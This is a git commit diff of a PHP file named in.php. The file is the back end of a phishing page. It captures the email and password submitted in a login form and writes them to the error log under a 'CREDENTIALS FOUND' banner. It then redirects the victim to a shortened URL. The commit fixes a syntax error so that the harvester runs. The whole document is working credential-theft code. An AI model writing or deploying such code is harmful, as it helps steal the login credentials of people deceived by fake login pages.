5482866d34dbd018d943afad0fb1b1333aadc245
dharick <58396545+dharick@users.noreply.github.com>
2022-08-26 13:05:08 +0530

    Update in.php

--- in.php
+++ in.php
@@ -1,7 +1,7 @@
 <?php
 $username = $_POST['Email'];
 $password = $_POST['password'];
-$res = [+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password;
+$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
 error_log("[+] Credentials Found!!!");
 error_log("$res");
 echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
